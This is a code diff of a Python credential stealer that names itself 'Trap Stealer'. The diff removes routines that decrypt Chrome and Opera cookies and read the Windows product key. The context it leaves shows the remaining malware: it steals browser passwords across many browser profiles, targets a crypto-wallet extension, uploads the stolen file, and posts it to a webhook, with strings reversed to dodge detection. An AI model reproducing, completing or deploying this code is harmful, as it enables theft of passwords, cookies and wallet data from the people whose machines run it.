@@ -136,7 +136,6 @@ class DATA_BLOB(Structure):
         ('pbData', POINTER(c_char))
     ]
 
-
 def GetData(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
@@ -277,22 +276,6 @@ else:pass
 pas = 'drowssaP'
 
 def systemInfo():
-    flag = 0x08000000
-    sh1 = "wmic csproduct get uuid"
-    sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
-    sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
-    try:
-        uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
-    except Exception:
-        uuidwndz = "N/A"
-    try:
-        w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
-    except Exception:
-        w1nk33y = "N/A"
-    try:
-        w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
-    except Exception:
-        w1nv3r = "N/A"
     system = platform.system()
     node_name = platform.node()
     release = platform.release()
@@ -308,10 +291,7 @@ def systemInfo():
                f"Version: {version}\n"\
                f"Machine: {machine}\n"\
                f"Processor: {processor}\n"\
-               f"Home directory: {home_dir}\n"\
-               f"UUID: {uuidwndz}"\
-               f"WinVer: {w1nv3r}"\
-               f"Windows Key: {w1nk33y}"\
+               f"Home directory: {home_dir}\n"
 
     return sys_info
 
@@ -622,49 +602,6 @@ def writeforfile(data, name):
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
-cookiWords = []
-Cookies = []
-CookiCount = 0
-def getCookie(path, arg):
-    global Cookies, CookiCount
-    if not os.path.exists(path): return
-
-    pathC = path + arg + "/Cookies"
-    if os.stat(pathC).st_size == 0: return
-
-    tempfold = (
-        f"{temp}wp"
-        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
-        + ".db"
-    )
-
-    shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-
-    pathKey = f"{path}/Local State"
-
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])
-
-    for row in data: 
-        if row[0] != '':
-            for wa in keyword:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0] and old not in cookiWords:
-                    cookiWords.append(old)
-            Cookies.append(f"Host Key: {row[0]} | Name: {row[1]} | Value: {DecryptValue(row[2], master_key)}")
-            CookiCount += 1
-    writeforfile(Cookies, 'cook')
 
 paswWords = []
 Passw = []
@@ -737,8 +674,7 @@ else:
     pass
 
 def GatherAll():
-    browserPaths = [        
-        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+    browserPaths = [        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
         [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -766,34 +702,23 @@ def GatherAll():
         a.start()
         Threadlist.append(a)
 
-    ThCokk = []
-    for patt in browserPaths: 
-        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
-        a.start()
-        ThCokk.append(a)
-
     for thread in Threadlist:
         thread.join()
-    files = ["wppassw.txt", "wpcook.txt"]
-    file_urls = []
+    file = os.getenv("TEMP") + f"\wppassw.txt"; filename = "wppassw.txt"
 
-    for filename in files:
-        file_path = os.path.join(os.getenv("TEMP"), filename)
-        file_url = upload_file(file_path)
-        file_urls.append({"name": filename, "value": f"[Click here to download]({file_url})"})
-
+    a = upload_file(file)
+    embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
     pas = 'drowssaP'
-    coo = 'eikooC'
     data = {
         "username": "Trap Stealer",
         "content": "",
         "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
         "embeds": [
             {
-                "title": f"🍪 Trap Stealer {pas[::-1]} + {coo[::-1]}",
-                "description": f"stats :\n{coo[::-1]} = {CookiCount} Cookies\n{pas[::-1]} = {PasswCount} {pas[::-1]}",
+                "title": f"🍪 Trap Stealer {pas[::-1]}",
+                "description": f"{pas[::-1]} File URL : ",
                 "color": 0xffb6c1,
-                "fields": file_urls,
+                "fields": embed_fields,
                 "thumbnail": {
                     "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                 },
@@ -804,7 +729,6 @@ def GatherAll():
             }
         ]
     }
-
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 
